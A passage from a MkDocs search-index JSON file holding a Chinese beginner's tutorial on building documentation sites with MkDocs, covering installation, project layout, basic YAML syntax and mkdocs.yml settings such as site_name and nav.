\u8fd8\u4e3a\u300c\u52a8\u624b\u80fd\u529b\u5f3a\u300d\u7684\u73a9\u5bb6\u4eec\u63d0\u4f9b\u4e86\u6269\u5c55\u7684\u7a7a\u95f4\uff1a\u6211\u4eec\u53ef\u4ee5\u8fdb\u4e00\u6b65\u8ba9\u66f4\u591a\u8bed\u6cd5\u7279\u6027\u4f53\u73b0\u5728\u6587\u6863\u5185\u5bb9\u4e2d\uff0c\u5982\u4e3a Markdown \u589e\u52a0\u5217\u8868\u8bed\u6cd5\u7b49\uff1b\u6211\u4eec\u4e5f\u53ef\u4ee5\u5bf9 MkDocs \u6784\u5efa\u7684\u7ad9\u70b9\u7684\u5e03\u5c40\u6837\u5f0f\u8fdb\u884c\u4e8c\u6b21\u5b9a\u5236\u548c\u7f16\u6392\uff0c\u4f7f\u5f97\u6574\u4e2a\u7ad9\u70b9\u66f4\u52a0\u7f8e\u89c2\u3002</p> <p>MkDocs \u7684\u4e0a\u8ff0\u4f18\u70b9\uff0c\u8ba9\u5b83\u88ab\u5f88\u591a\u77e5\u540d\u5f00\u6e90\u9879\u76ee\u9009\u4e2d\uff0c\u7528\u4e8e\u642d\u5efa\u548c\u9879\u76ee\u76f8\u5173\u7684\u6587\u6863\u7f51\u7ad9\u3002\u6bd4\u5982 Python \u91cc\u77e5\u540d\u7684 Web \u5708\u91cc\u7684\u00a0django-rest-framework\u3001FastAPI\u00a0\u4ee5\u53ca\u57fa\u4e8e Go \u7f16\u5199\u7684\u4e91\u7f51\u5173\u4ee3\u7406\u670d\u52a1\u5668\u00a0traefik\u00a0\u7b49\u9879\u76ee\u7684\u5b98\u65b9\u6587\u6863\u7ad9\u70b9\uff0c\u90fd\u662f\u901a\u8fc7 MkDocs \u8fdb\u884c\u642d\u5efa\u3002</p> <p>\u5f53\u7136\uff0cMkDocs \u5e76\u4e0d\u4ec5\u4ec5\u662f\u5f00\u53d1\u8005\u7684\u73a9\u7269\u3002\u7531\u4e8e\u6587\u6863\u7684\u672c\u8d28\u5c31\u662f\u4e00\u7ec4\u7ed3\u6784\u5316\u3001\u4f53\u7cfb\u5316\u7684\u8bf4\u660e\u6587\u672c\uff0c\u4efb\u4f55\u5177\u6709\u8fd9\u79cd\u7279\u5f81\u7684\u5185\u5bb9\u2014\u2014\u4f8b\u5982\u5c31\u7279\u5b9a\u8bdd\u9898\u6240\u505a\u7684\u7b14\u8bb0\u3001Wiki \u7b49\u2014\u2014\u53ea\u8981\u662f\u4f7f\u7528\u4e86 Markdown \u683c\u5f0f\u8bb0\u5f55\uff0c\u90a3\u4e48\u7528 MkDocs \u6765\u642d\u5efa\u4e00\u4e2a\u81ea\u7528\u7684 Cookbook \u6216\u53c2\u8003\u624b\u518c\u4e5f\u5b8c\u5168\u4e0d\u5728\u8bdd\u4e0b\u3002</p> <p>\u56e0\u6b64\uff0c\u5982\u679c\u4f60\u548c\u6211\u4e00\u6837\u662f\u4e2a Markdown \u7231\u597d\u8005\u5e76\u4f7f\u7528 Markdown \u6765\u5199\u4f5c\u6216\u8bb0\u5f55\uff0c\u5e76\u4e14\u4e0d\u60f3\u82b1\u8d39\u8fc7\u591a\u65f6\u95f4\u548c\u7cbe\u529b\u5728\u7410\u788e\u7684\u7ad9\u70b9\u8bbe\u8ba1\u4e0a\uff0c\u90a3\u4e48 MkDocs \u662f\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\u3002</p> <p>\u6ce8\uff1a\u5c3d\u7ba1 MkDocs \u6ca1\u6709\u63d0\u4f9b\u6c49\u5316\u7ffb\u8bd1\uff0c\u4f46\u5b83\u7684\u6587\u6863\u5185\u5bb9\u8db3\u591f\u7b80\u6d01\u660e\u4e86\uff0c\u6240\u4ee5\u5373\u4f7f\u8bfb\u8005\u5bf9\u81ea\u5df1\u7684\u82f1\u8bed\u6c34\u5e73\u4e0d\u592a\u6709\u4fe1\u5fc3\uff0c\u4e5f\u53ef\u4ee5\u5728\u7ffb\u8bd1\u8f6f\u4ef6\u7684\u548c\u793a\u4f8b\u9879\u76ee\u7684\u5e2e\u52a9\u4e0b\uff0c\u5feb\u901f\u4e0a\u624b\u5e76\u6784\u5efa\u4e00\u4e2a\u7ad9\u70b9\u3002</p>"},{"location":"out_class_learning/quickly_learning/MkDocs%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#_2","title":"\u5feb\u901f\u4e0a\u624b","text":"<p>\u4e0b\u9762\uff0c\u6211\u4eec\u6765\u5c1d\u8bd5\u4ece\u65e0\u5230\u6709\u7528 MkDocs \u5236\u4f5c\u4e00\u4e2a\u7f51\u7ad9\uff0c\u987a\u4fbf\u5bf9\u5b83\u7684\u8f7b\u91cf\u5feb\u6377\u5efa\u7acb\u4e00\u4e2a\u76f4\u89c2\u8ba4\u8bc6\u3002</p> <p>\u9996\u5148\uff0c\u8bf7\u786e\u4fdd\u81ea\u5df1\u5b89\u88c5\u4e86 Python3\uff0c\u7136\u540e\u901a\u8fc7\u547d\u4ee4\u00a0<code>pip install mkdocs</code>\u00a0\u5b89\u88c5 MkDocs\u3002\u7136\u540e\uff0c\u6309\u7167\u4e0b\u5217\u6b65\u9aa4\u65b0\u5efa\u7ad9\u70b9\uff1a</p> <ol> <li>\u4f7f\u7528\u00a0<code>mkdocs new &lt;your-site-project-name&gt;</code>\u00a0\u65b0\u5efa\u7ad9\u70b9\u9879\u76ee\uff0c\u6bd4\u5982\u6211\u8fd9\u91cc\u53eb\u00a0<code>mysite</code>\uff0c\u5219\u662f\u00a0<code>mkdocs new mysite</code>\uff1b</li> <li>\u5207\u6362\u5230\u00a0<code>mysite</code>\u00a0\u76ee\u5f55\u4e0b\uff0c\u5e76\u4f7f\u7528\u00a0<code>mkdocs serve</code>\u00a0\u5728\u672c\u5730\u8fd0\u884c\u3002</li> </ol> <p>\u7b2c\u4e09\u6b65\u2026\u2026\u6ca1\u6709\u7b2c\u4e09\u6b65\u4e86\u3002\u73b0\u5728\u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u8f93\u5165\u00a0<code>localhost:8000</code>\uff0c\u5c31\u80fd\u9884\u89c8\u5230 MkDocs \u5e2e\u6211\u4eec\u642d\u5efa\u597d\u7684\u6587\u6863\u7ad9\u70b9\u4e86\u3002</p> <p>\u4e0a\u9762\u7528\u5230\u7684\u662f\u5b98\u65b9\u5feb\u901f\u65b0\u5efa\u7684\u793a\u4f8b\u8fdb\u884c\u6f14\u793a\uff0c\u4f46\u5047\u5982\u6211\u4eec\u5df2\u7ecf\u6709\u4e86\u9879\u76ee\u76ee\u5f55\uff0c\u90a3\u4e48\u4e5f\u65e0\u9700\u4ece\u5934\u518d\u53bb\u521b\u5efa\u7ad9\u70b9\u3002</p> <p>\u5bf9\u4e8e\u8fd9\u79cd\u60c5\u51b5\uff0c\u76f4\u63a5\u5728\u539f\u6709\u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2a\u00a0<code>docs</code>\u00a0\u6587\u4ef6\u5939\u5e76\u5305\u542b\u4e00\u4e2a\u540d\u4e3a\u00a0<code>index.md</code>\u00a0\u7684 Markdown \u6587\u4ef6\uff1b\u540c\u65f6\u5728\u539f\u6709\u76ee\u5f55\u4e0b\u518d\u65b0\u5efa\u4e00\u4e2a\u540d\u4e3a\u00a0<code>mkdocs.yml</code>\u00a0\u7684\u6587\u4ef6\u5e76\u586b\u5199\u57fa\u672c\u4fe1\u606f\u4e4b\u540e\uff0c\u5c31\u80fd\u76f4\u63a5\u901a\u8fc7\u00a0<code>mkdocs serve</code>\u00a0\u770b\u5230\u6548\u679c\u4e86\u3002\u4f8b\u5982\uff1a</p> <pre><code>my-exist-projct\n\u251c\u2500\u2500 docs\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 index.md\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 notes\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 mkdocs.md\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 python.md\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 sspai\n\u2514\u2500\u2500 mkdocs.yml\n</code></pre> <p>\u5927\u90e8\u5206\u4f7f\u7528 MkDocs \u642d\u5efa\u7684\u6587\u6863\u7ad9\u70b9\uff0c\u90fd\u6709\u7740\u548c\u4e0a\u8ff0\u793a\u4f8b\u7c7b\u4f3c\u7684\u76ee\u5f55\u7ed3\u6784\uff1a</p> <ul> <li><code>docs</code>\u00a0\u6587\u4ef6\u5939\u5c31\u662f\u7528\u4e8e\u5b58\u653e\u6211\u4eec\u6240\u6709\u7684 Markdown \u683c\u5f0f\u7684\u6587\u6863\u5185\u5bb9\uff0c\u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u6839\u636e\u81ea\u5df1\u7684\u9700\u8981\u8fdb\u4e00\u6b65\u7528\u6587\u4ef6\u5939\u5f52\u7c7b\u5212\u5206\uff0c\u8fd9\u4e5f\u662f MkDocs \u8fd0\u884c\u65f6\u9ed8\u8ba4\u7684\u6839\u8def\u5f84\u3002\u6211\u4eec\u4e5f\u53ef\u4ee5\u540e\u7eed\u624b\u52a8\u6307\u5b9a\u4fee\u6539\u6210\u5176\u4ed6\u76ee\u5f55\u3002</li> <li><code>mkdocs.yml</code>\u00a0\u8be5\u6587\u4ef6\u4e3b\u8981\u7528\u4e8e MkDocs \u7684\u5b9a\u5236\u5316\u914d\u7f6e\u7684\u8bbe\u7f6e\u4e0e\u7ba1\u7406\u3002</li> <li><code>docs/index.md</code>\u00a0\u8be5\u6587\u6863\u5185\u5bb9\u662f\u5fc5\u987b\u8981\u6709\u7684\uff0c\u5b83\u662f\u6574\u4e2a MkDocs \u6784\u5efa\u7684\u9996\u9875\u5165\u53e3</li> </ul> <p>\u56e0\u4e3a MkDocs \u53ea\u4f1a\u5bf9 Markdown \u6587\u4ef6\u8fdb\u884c\u5904\u7406\uff0c\u56e0\u6b64\u6211\u4eec\u9664\u4e86\u9700\u8981\u5c06\u81ea\u5df1\u7535\u5b50\u5316\u7684\u8bb0\u5f55\u6216\u8005\u7b14\u8bb0\u653e\u5230\u00a0<code>docs</code>\u00a0\u8fd9\u4e00\u76ee\u5f55\u4e4b\u5916\uff0c\u8fd8\u9700\u8981\u786e\u4fdd\u8fd9\u4e9b\u6587\u6863\u6587\u4ef6\u7684\u6269\u5c55\u540d\u4e3a\u00a0<code>.md</code>\u00a0\u7684 Markdown \u683c\u5f0f\u3002</p> <p>\u786e\u4fdd\u7ed3\u6784\u3001\u683c\u5f0f\u6ca1\u6709\u95ee\u9898\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f00\u59cb\u7f16\u5199\u76f8\u5173\u7684\u914d\u7f6e\u6587\u4ef6\u4e86\uff0c\u56e0\u4e3a\u53ea\u6709\u7f16\u5199\u4e86\u914d\u7f6e\u6587\u4ef6\u624d\u80fd\u8ba9 MkDocs \u66f4\u597d\u5730\u7b26\u5408\u6211\u4eec\u7684\u9700\u8981\u53bb\u6784\u5efa\u7ad9\u70b9\u3002</p>"},{"location":"out_class_learning/quickly_learning/MkDocs%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#yaml","title":"YAML \u914d\u7f6e\u6587\u4ef6\u683c\u5f0f\u901f\u6210","text":"<p>\u7a0d\u7b49\uff01\u867d\u7136\u6211\u4eec\u51c6\u5907\u597d\u4e86\u76f8\u5173 Markdown \u7684\u6587\u6863\u5185\u5bb9\uff0c\u4f46\u60f3\u8981 MkDocs \u8fd0\u884c\u8d77\u6765\u8fd8\u9700\u8981\u989d\u5916\u7684\u4e00\u4e2a\u6b65\u9aa4\uff0c\u90a3\u5c31\u662f\u7f16\u5199\u5173\u4e8e MkDocs \u7684\u914d\u7f6e\u6587\u4ef6\u3002</p> <p>\u548c\u524d\u9762\u63d0\u5230\u7684\u5176\u4ed6\u51e0\u4e2a\u6846\u67b6\u4e00\u6837\uff0cMkDocs \u4e5f\u5b58\u5728\u8bb8\u591a\u53ef\u9009\u914d\u7f6e\uff0c\u9700\u8981\u901a\u8fc7\u00a0<code>mkdocs.yml</code>\u00a0\u8fd9\u4e00\u4e2a YAML \u6587\u4ef6\u6765\u8fdb\u884c\u8bbe\u7f6e\u548c\u7ba1\u7406\u3002\u56e0\u6b64\u6211\u4eec\u9700\u8981\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b YAML \u4ee5\u53ca\u5982\u4f55\u7f16\u5199 YAML \u6587\u4ef6\u3002</p> <p>YAML \u662f\u00a0YAML\u00a0Ain't\u00a0Markup\u00a0Language \u7684\u9012\u5f52\u7f29\u7565\u8bed\uff0c\u4e5f\u662f\u4e00\u79cd\u4eba\u7c7b\u53ef\u8bfb\uff08human-readable) \u7684\u6570\u636e\u5e8f\u5217\u5316\u8bed\u8a00\uff0c\u5176\u6587\u4ef6\u6269\u5c55\u540d\u4e3a\u00a0<code>.yml</code>\u00a0\u6216\u00a0<code>.yaml</code>\uff08\u5b98\u65b9\u63a8\u8350\uff09\u3002\u5e38\u88ab\u7528\u4f5c\u548c JSON \u683c\u5f0f\u6587\u4ef6\u4e00\u6837\u7f16\u5199\u914d\u7f6e\u6216\u5b58\u50a8\u76f8\u5173\u6570\u636e\u5185\u5bb9\u3002</p> <p>YAML \u8bed\u6cd5\u7684\u5b98\u65b9\u6587\u6863\u957f\u8fbe\u516b\u5341\u591a\u9875\uff08~~\u4e27\u5fc3\u75c5\u72c2~~\uff09\uff0c\u4ece\u4e00\u4e2a\u4fa7\u9762\u53cd\u6620\u4e86\u5176\u652f\u6301\u7684\u8bed\u6cd5\u7279\u6027\u6709\u591a\u4e48\u4e30\u5bcc\u3002\u4e0d\u8fc7\uff0c\u867d\u7136\u6587\u6863\u957f\u5ea6\u5f88\u552c\u4eba\uff0c\u4f46\u300c\u4e8c\u516b\u5b9a\u5f8b\u300d\u4ecd\u7136\u9002\u7528\uff1a\u5176\u4e2d 80% \u7684\u8bed\u6cd5\u90fd\u662f\u6bd4\u8f83\u7b80\u5355\u4e5f\u88ab\u7ecf\u5e38\u4f7f\u7528\uff0c\u53e6\u5916 20% \u7684\u8bed\u6cd5\u5e76\u4e0d\u5e38\u7528\uff0c\u9700\u8981\u6211\u4eec\u989d\u5916\u67e5\u9605\u6587\u6863\u3002\u4e0d\u4ec5\u5982\u6b64\uff0c\u7531\u4e8e MkDocs \u672c\u8eab\u914d\u7f6e\u9879\u5c31\u4e0d\u591a\uff0c\u56e0\u6b64\u6211\u4eec\u5728\u7f16\u5199\u00a0<code>mkdocs.yml</code>\u65f6\uff0c\u771f\u6b63\u7528\u5230\u7684 YAML \u8bed\u6cd5\u53ef\u80fd\u4e0d\u5230 10%\u3002</p> <p>\u8fd9\u6837\u4e00\u6765\uff0c\u6211\u4eec\u53ea\u9700\u8981\u8c28\u8bb0\u4ee5\u4e0b\u4e09\u4e2a\u6838\u5fc3\u5143\u7d20\u7684\u7528\u6cd5\uff0c\u5c31\u80fd\u5e94\u4ed8\u5927\u591a\u6570 YAML \u914d\u7f6e\u9700\u6c42\uff0c\u5305\u62ec\u672c\u6587\u7684\u4e3b\u89d2 MkDocs\uff1a</p> <ol> <li>\u952e\u503c\u5bf9\uff08Key-Value Pair\uff09</li> <li>\u7f29\u8fdb\uff08indent\uff09</li> <li>\u540c\u4e00\u5c42\u7ea7\u4e0b\u4e0d\u80fd\u6709\u91cd\u540d\u952e</li> <li>\u952e\u503c\u5bf9</li> </ol> <p>\u6ca1\u6709\u7f16\u7a0b\u7ecf\u9a8c\u7684\u670b\u53cb\u53ef\u80fd\u89c9\u5f97\u952e\u503c\u662f\u4ec0\u4e48\u62bd\u8c61\u96be\u61c2\u7684\u6982\u5ff5\uff0c\u8fd9\u5176\u5b9e\u7406\u89e3\u4e3a\u300c\u6807\u8bb0\u4e0e\u5185\u5bb9\u7684\u5bf9\u5e94\u5f62\u5f0f\u300d\u5373\u53ef\u3002</p> <p>\u952e\u503c\u5bf9\u5728 YAML \u4e2d\u7684\u5f62\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>name: 100gle\n</code></pre> <p>\u5176\u4e2d\u7684\u6807\u8bb0\uff08\u952e\uff09\u5c31\u662f\u4e0a\u9762\u7684\u00a0<code>name</code>\uff0c\u5728\u73b0\u5b9e\u751f\u6d3b\u4e2d\u53ef\u4ee5\u8868\u73b0\u4e3a\u6211\u4eec\u5f88\u591a\u5c5e\u6027\u7684\u4ee3\u79f0\uff0c\u6bd4\u5982\u6027\u522b\u3001\u5e74\u9f84\u3001\u804c\u4f4d\u7b49\u7b49\uff1b\u800c\u5185\u5bb9\uff08\u503c\uff09\u5c31\u662f\u8fd9\u4e9b\u4ee3\u79f0\u4e0b\u7684\u5177\u4f53\u8be6\u60c5\uff0c\u6bd4\u5982\u7537\u30013 \u5c81\u3001\u5c11\u6570\u6d3e\u9e3d\u5b50\u7b49\u7b49\u3002\u8fd9\u5728 YAML \u4e2d\u901a\u8fc7\u4e00\u4e2a\u00a0<code>:</code>\u00a0\u82f1\u6587\u5192\u53f7\u5c06\u4e8c\u8005\u8054\u7cfb\u8d77\u6765\u4e86\uff0c\u8fd9\u7b49\u4ef7\u4e8e\u7f16\u7a0b\u8bed\u8a00\u91cc\u7684\u00a0<code>=</code>\u00a0\u7b49\u4e8e\u53f7\u3002</p> <ul> <li>\u7f29\u8fdb</li> </ul> <p>YAML \u7528\u00a0\u7a7a\u683c\u00a0\u7f29\u8fdb\u6765\u8868\u793a\u5c42\u7ea7\u5173\u7cfb\uff0c\u8fd9\u533a\u522b\u4e8e\u53e6\u4e00\u79cd\u6d41\u884c\u914d\u7f6e\u683c\u5f0f JSON \u4f7f\u7528\u7684\u82b1\u62ec\u53f7\u00a0<code>{}</code>\uff0c\u53ef\u80fd\u662f\u53d7\u5230\u4e86 Python \u7684\u5f71\u54cd\u3002</p> <pre><code>family:\n  father:\n    name: foo\n    age: 100\n  child:\n    name: baz\n    age: 3\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7a7a\u683c\uff08ASCII \u7801\u503c\u4e3a 32\uff09\u6709\u7684\u65f6\u5019\u4f1a\u548c Tab \u952e\u4ea7\u751f\u7684\u5236\u8868\u7b26\uff08ASCII \u7801\u503c\u4e3a 9\uff09\u6df7\u5728\u4e00\u8d77\uff0c\u4e8c\u8005\u5355\u4ece\u5916\u89c2\u4e0a\u6765\u770b\u65e0\u6cd5\u5206\u8fa8\uff0c\u56e0\u6b64\u4e3a\u907f\u514d YAML \u89e3\u6790\u9519\u8bef\uff0c\u6211\u4eec\u5728\u7f16\u5199\u65f6\u8981\u9075\u5faa YAML \u5b98\u65b9\u7f29\u8fdb\u7684\u8981\u6c42\u4f7f\u7528\u00a0\u4e24\u4e2a\u534a\u89d2\u7a7a\u683c\u3002</p> <ul> <li>\u540c\u4e00\u5c42\u7ea7\u4e0b\u4e0d\u80fd\u6709\u540c\u540d\u952e</li> </ul> <p>\u4e86\u89e3\u952e\u503c\u5bf9\u548c\u7f29\u8fdb\u503c\u540e\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u5c31\u662f YAML\u00a0\u4e0d\u5141\u8bb8\u5728\u540c\u4e00\u5c42\u7ea7\u4e0b\u51fa\u73b0\u76f8\u540c\u7684\u952e\uff0c\u4f8b\u5982\uff1a</p> <pre><code>father:\n  name: foo\n  age: 100\nfamily:\n  father:\n      name: foo\n      age: 100\n  child:\n      name: baz\n      age: 3\n  father: foo\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u00a0<code>father</code>\u00a0\u548c\u4e24\u4e2a\u00a0<code>family/father</code>\u00a0\u952e\uff08\u884c\u6587\u65b9\u4fbf\u8d77\u89c1\uff0c\u6211\u8fd9\u91cc\u4f1a\u4ee5\u6587\u4ef6\u8def\u5f84\u7684\u5f62\u5f0f\u8868\u73b0\u5c42\u7ea7\u5173\u7cfb\uff09\u867d\u7136\u540c\u540d\uff0c\u4f46\u56e0\u4e3a\u5b83\u4eec\u5e76\u4e0d\u5728\u4e00\u4e2a\u5c42\u7ea7\u4e2d\uff0c\u56e0\u6b64\u5e76\u4e0d\u4f1a\u4ea7\u751f\u51b2\u7a81\u3002</p> <p>\u4f46\u662f\u5728\u00a0<code>family</code>\u00a0\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u00a0<code>family/father</code>\u00a0\u4f1a\u548c\u7b2c\u4e09\u4e2a\u00a0<code>family/father</code>\u00a0\u4ea7\u751f\u51b2\u7a81\uff0c\u56e0\u4e3a\u5b83\u4eec\u540c\u7ea7\u4e14\u540c\u540d\u3002</p> <p>\u8fd9\u5c31\u597d\u6bd4\u5728\u540c\u4e00\u4e2a\u73ed\u7ea7\u91cc\u6709\u4e24\u4e2a\u540c\u540d\u7684\u5f20\u4e09\uff0c\u540c\u5b66\u4eec\u5982\u679c\u53ea\u662f\u770b\u540d\u5b57\u80af\u5b9a\u90fd\u6ca1\u529e\u6cd5\u5206\u8fa8\u5f97\u51fa\u63d0\u5230\u7684\u662f\u54ea\u4e2a\u5f20\u4e09\uff0c\u66f4\u522b\u8bf4\u7a0b\u5e8f\u548c\u8ba1\u7b97\u673a\u4e86\u3002</p>"},{"location":"out_class_learning/quickly_learning/MkDocs%20%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/#mkdocsyml","title":"\u5728 mkdocs.yml \u4e2d\u7f16\u5199\u914d\u7f6e","text":"<p>\u4e86\u89e3\u4e86 YAML \u7684\u7b80\u5355\u7528\u6cd5\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u7f16\u5199\u00a0<code>mkdocs.yml</code>\u00a0\u6587\u4ef6\u4e86\u3002\u5728\u7f16\u5199\u7684\u8fc7\u7a0b\u4e2d\u6211\u4eec\u4f1a\u78b0\u5230\u5b57\u7b26\u4e32\u548c\u5217\u8868\u7684\u8868\u8fbe\u8bed\u6cd5\uff0c\u4f46\u6211\u5e76\u4e0d\u6253\u7b97\u5728\u8fd9\u91cc\u518d\u7ee7\u7eed\u5c55\u5f00\uff0c\u56e0\u4e3a\u5b83\u4eec\u5341\u5206\u7b80\u5355\uff0c\u4e00\u770b\u4fbf\u80fd\u77e5\u9053\u3002</p> <p>\u5173\u4e8e MkDocs \u652f\u6301\u7684\u6240\u6709\u914d\u7f6e\u4f60\u90fd\u80fd\u5728\u00a0\u5b98\u65b9\u6587\u6863\u00a0\u4e2d\u627e\u5230\uff0c\u4f46\u5f53\u4e2d\u7684\u914d\u7f6e\u6211\u4eec\u53ea\u9700\u8981\u586b\u5199\u5173\u952e\u7684\u51e0\u4e2a\u5373\u53ef\u3002</p> <ul> <li>\u6dfb\u52a0\u7ad9\u70b9\u4fe1\u606f</li> </ul> <p>\u6700\u5f00\u59cb\u5728\u00a0<code>mkdocs.yml</code>\u00a0\u6587\u4ef6\u4e2d\u586b\u5199\u7684\u4e3b\u8981\u8fd8\u662f\u5173\u4e8e\u7ad9\u70b9\u76f8\u5173\u7684\u4fe1\u606f\u3002\u5176\u4e2d\u6211\u4eec\u53ef\u4ee5\u586b\u5199\u7684\u6709\u90a3\u4e48\u51e0\u4e2a\uff1a</p> <ul> <li><code>site_name</code>\uff1a\u7ad9\u70b9\u540d\u79f0</li> <li><code>site_url</code>\uff1a\u7ad9\u70b9 URL \u94fe\u63a5</li> <li><code>site_author</code>\uff1a\u7ad9\u70b9\u4f5c\u8005</li> <li><code>site_description</code>\uff1a\u7ad9\u70b9\u63cf\u8ff0</li> <li><code>copyright</code>\uff1a\u7248\u6743\u4fe1\u606f</li> <li><code>repo_url</code>\uff1a\u7ad9\u70b9\u4ed3\u5e93 URL</li> </ul> <p>\u5176\u4e2d\uff0c\u53ea\u6709\u4e24\u4e2a\u5fc5\u987b\u8981\u586b\u5199\u7684\u914d\u7f6e\u9879\u5c31\u662f\u00a0<code>site_name</code>\u00a0\u7ad9\u70b9\u540d\u79f0\u548c\u00a0<code>site_url</code>\u00a0\u7ad9\u70b9 URL \u94fe\u63a5\u3002\u4f8b\u5982\uff1a</p> <pre><code>site_name: \"My Notes\"\nsite_url: \"http://&lt;domain&gt;:&lt;port&gt;/&lt;project&gt;\"\n</code></pre> <p>\u4f46\u5982\u679c\u6211\u4eec\u4f7f\u7528\u7684\u662f\uff0c<code>mkdocs serve</code>\u00a0\u6765\u672c\u5730\u8fd0\u884c\uff0c\u90a3\u4e48\u65e0\u9700\u586b\u5199\u00a0<code>site_url</code>\uff0c\u56e0\u4e3a MkDocs \u4f1a\u81ea\u52a8\u5c06\u5176\u6302\u5728\u672c\u5730\u7684\u00a0<code>http://127.0.0.1:8000/&lt;your-site-project&gt;</code>\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\u7684\u9009\u9879\u90fd\u662f\u9009\u586b\uff0c\u5982\u679c\u586b\u5199\u4e86\u5219 MkDocs \u4f1a\u5c06\u5176\u4f5c\u4e3a\u5143\u6570\u636e\u6216\u5143\u7d20\u6e32\u67d3\u6700\u540e\u7684 HTML \u4e2d\u3002</p> <ul> <li>\u6dfb\u52a0\u6587\u6863\u8def\u5f84</li> </ul> <p>\u65e2\u7136\u6211\u4eec\u60f3\u8981\u642d\u5efa\u7684\u662f\u4e00\u4e2a\u6587\u6863\u7ad9\u70b9\uff0c\u90a3\u4e48\u6587\u6863\u5185\u5bb9\u624d\u662f\u5173\u952e\uff0c\u9664\u4e86\u5bf9\u5185\u5bb9\u8fdb\u884c\u5fc5\u8981\u7684\u6392\u7248\u6821\u5bf9\u4e4b\u5916\uff0c\u5982\u4f55\u7ec4\u7ec7\u6587\u6863\u6216\u662f\u8ba9\u6587\u6863\u4ee5\u6e05\u6670\u6709\u5c42\u6b21\u7684\u7ed3\u6784\u5c55\u793a\u4e5f\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u3002</p> <p>MkDocs \u63d0\u4f9b\u4e86\u8ba9\u4f7f\u7528\u8005\u80fd\u591f\u81ea\u7531\u5b89\u6392\u6587\u6863\u5c42\u7ea7\u7ed3\u6784\u6216\u76ee\u5f55\u7f16\u6392\u7684\u8bbe\u7f6e\uff0c\u8fd9\u5c06\u51b3\u5b9a\u6700\u540e\u6587\u6863\u5728\u7ad9\u70b9\u4e2d\u7684\u7f16\u6392\u6548\u679c\u5982\u4f55\u3002\u8fd9\u91cc\u4e3b\u8981\u662f\u901a\u8fc7\u00a0<code>nav</code>\u00a0\u9879\u6765\u8fdb\u884c\u914d\u7f6e\uff1a</p> <pre><code>nav:\n  - \"index.md\"\n  - user-guide:\n      - quickstart: \"user-guide/quickstart.md\"\n      - usage: \"user-guide/how-to-use-MkDocs.md\"\n  - \"about.md\"\n  - \"license.md\"\n</code></pre> <p>\u5728\u8be5\u8bbe\u7f6e\u9879\u4e2d\uff0c\u4f7f\u7528\u4e86 YAML \u6240\u652f\u6301\u7684\u5217\u8868\u8bed\u6cd5\uff0c\u8fd9\u548c Markdown \u7684\u65e0\u5e8f\u5217\u8868\u8bed\u6cd5\u662f\u5b8c\u5168\u4e00\u81f4\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5982\u679c\u4e0d\u6307\u5b9a\u952e\u540d\uff0cMkDocs \u4f1a\u81ea\u52a8\u6839\u636e\u5217\u4e3e\u7684 Markdown \u6587\u4ef6\u540d\u5b57\u7b26\u4e32\u6765\u786e\u5b9a\u6700\u7ec8\u8be5\u9875\u9762\u7684\u540d\u79f0\u5982\u4f55\uff1b\u5982\u679c\u6211\u4eec\u624b\u52a8\u6307\u5b9a\u4e86\u952e\u540d\uff0c\u90a3\u4e48\u4f1a\u4f18\u5148\u4ee5\u6211\u4eec\u7684\u952e\u540d\u4e3a\u4e3b\uff0c\u6bd4\u5982\u8fd9\u91cc\u7684\u00a0<code>user-guide/usage</code>\u00a0\u8fd9\u4e00\u90e8\u5206\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u524d\u9762\u5bf9\u4e8e MkDocs \u7684\u5feb\u901f\u4ecb\u7ecd\u4e2d\u6211\u5c31\u6709\u63d0\u5230\uff0cMkDocs \u9ed8\u8ba4\u4f1a\u5c06\u9879\u76ee\u76ee\u5f55\u4e0b\u7684\u00a0<code>docs</code>\u00a0\u76ee\u5f55\u4f5c\u4e3a\u9ed8\u8ba4\u7684\u6839\u8def\u5f84\uff0c\u6240\u4ee5\u5728\u00a0<code>nav</code>\u00a0\u8bbe\u7f6e\u4e2d\u6211\u4eec\u5982\u679c\u6307\u5b9a\u7684\u662f\u8be5\u76ee\u5f55\u4e0b\u7684\u5176\u4ed6\u5185\u5bb9\uff0c\u90a3\u4e48\u5c31\u662f\u53ea\u9700\u8981\u586b\u5199\u76f8\u5bf9\u8def\u5f84\u3002</p> <p>\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u5728\u4e0a\u8ff0\u4f8b\u5b50\u4e2d\u7684\u00a0<code>user-guide</code>\u00a0\u8fd9\u4e00\u90e8\u5206\u4e0b\u7684\u6587\u6863\u8def\u5f84\u90fd\u4e0d\u9700\u8981\u5199\u6210\u00a0<code>docs/user-guide/XXXX.md</code>\u00a0\u7684\u539f\u56e0\u3002</p> <p>\u540c\u65f6\uff0c\u6700\u7ec8 MkDocs \u4e5f\u4f1a\u6839\u636e\u00a0<code>nav</code>\u00a0\u914d\u7f6e\u7684\u5c42\u7ea7\u5173\u7cfb\u5c06\u5185\u5bb9\u7684\u5c42\u7ea7\u5173\u7cfb\u6216\u5305\u542b\u5173\u7cfb\u4e00\u540c\u6e32\u67d3\u3002</p> 